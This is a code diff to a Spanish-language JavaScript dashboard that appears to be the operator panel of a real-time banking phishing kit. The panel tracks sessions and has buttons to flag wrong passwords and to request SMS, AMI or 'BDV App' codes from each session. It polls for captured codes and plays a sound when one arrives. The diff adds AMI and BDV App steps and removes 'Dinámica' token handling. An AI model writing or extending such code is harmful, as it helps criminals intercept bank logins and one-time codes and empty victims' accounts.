@@ -23,13 +23,16 @@ function statusLabel(state) {
   if (state === 'done') return 'Listo'
   if (state === 'error-login') return 'Error de datos'
   if (state === 'error') return 'Error'
-  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
   if (state === 'waiting-sms') return 'SMS solicitado'
-  if (state === 'received-dinamica') return 'Dinámica'
-  if (state === 'received-sms') return 'SMS'
-  if (state === 'error-dinamica') return 'Error Dinámica'
+  if (state === 'waiting-ami') return 'AMI solicitado'
+  if (state === 'waiting-bdvapp') return 'BDV App solicitada'
+  if (state === 'received-sms') return 'SMS recibido'
+  if (state === 'received-ami') return 'AMI recibido'
+  if (state === 'received-bdvapp') return 'BDV App recibida'
   if (state === 'error-sms') return 'Error SMS'
-  if (state === 'typing') return 'Escribiendo código'
+  if (state === 'error-ami') return 'Error AMI'
+  if (state === 'error-bdvapp') return 'Error BDV App'
+  if (state === 'typing') return 'Escribiendo…'
   return 'Nuevo'
 }
 
@@ -39,20 +42,22 @@ function badgeClass(state) {
   }
   if (
     state === 'waiting' ||
-    state === 'waiting-dinamica' ||
-    state === 'waiting-sms'
+    state === 'waiting-sms' ||
+    state === 'waiting-ami' ||
+    state === 'waiting-bdvapp'
   ) {
     return 'badge badge--wait'
   }
   if (state === 'active') return 'badge badge--hola'
   if (state === 'done') return 'badge badge--done'
-  if (state === 'received-dinamica' || state === 'received-sms') {
+  if (state === 'received-sms' || state === 'received-ami' || state === 'received-bdvapp') {
     return 'badge badge--login'
   }
   if (
     state === 'error-login' ||
-    state === 'error-dinamica' ||
     state === 'error-sms' ||
+    state === 'error-ami' ||
+    state === 'error-bdvapp' ||
     state === 'error'
   ) {
     return 'badge badge--error'
@@ -144,23 +149,17 @@ function createRow(row) {
     <td>
       <div class="row-actions">
         <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
-        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
         <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
-        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
+        <button type="button" class="btn btn--ok" data-action="ami" style="background:#0056b3;">AMI</button>
+        <button type="button" class="btn btn--ok" data-action="bdvapp" style="background:#6f42c1;">BDV App</button>
         <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
+        <button type="button" class="btn btn--error" data-action="error-ami">Err AMI</button>
+        <button type="button" class="btn btn--error" data-action="error-bdvapp">Err App</button>
         <button type="button" class="btn btn--done" data-action="done">Listo</button>
       </div>
     </td>
   `
 
-  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
-    const current = rows.get(row.id)
-    if (current?.state === 'waiting-dinamica') {
-      setRowState(row.id, 'waiting', null)
-      return
-    }
-    setRowState(row.id, 'waiting-dinamica', 'dinamica')
-  })
   tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
     const current = rows.get(row.id)
     if (current?.state === 'waiting-sms') {
@@ -169,16 +168,36 @@ function createRow(row) {
     }
     setRowState(row.id, 'waiting-sms', 'sms')
   })
+  tr.querySelector('[data-action="ami"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-ami') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    setRowState(row.id, 'waiting-ami', 'ami')
+  })
+  tr.querySelector('[data-action="bdvapp"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-bdvapp') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    setRowState(row.id, 'waiting-bdvapp', 'bdvapp')
+  })
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-login', 'error-login')
     playErrorSound()
   })
-  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'error-dinamica', 'error-dinamica')
-    playErrorSound()
-  })
   tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-sms', 'error-sms')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="error-ami"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-ami', 'error-ami')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="error-bdvapp"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-bdvapp', 'error-bdvapp')
     playErrorSound()
   })
   tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
@@ -322,11 +341,13 @@ async function pollSessions() {
             // Trigger sound on any relevant state changes
             if (
               session.state === 'waiting' ||
-              session.state === 'received-dinamica' ||
               session.state === 'received-sms' ||
+              session.state === 'received-ami' ||
+              session.state === 'received-bdvapp' ||
               session.state === 'error-login' ||
-              session.state === 'error-dinamica' ||
               session.state === 'error-sms' ||
+              session.state === 'error-ami' ||
+              session.state === 'error-bdvapp' ||
               session.state === 'done'
             ) {
               hasNewOrChangedSession = true;
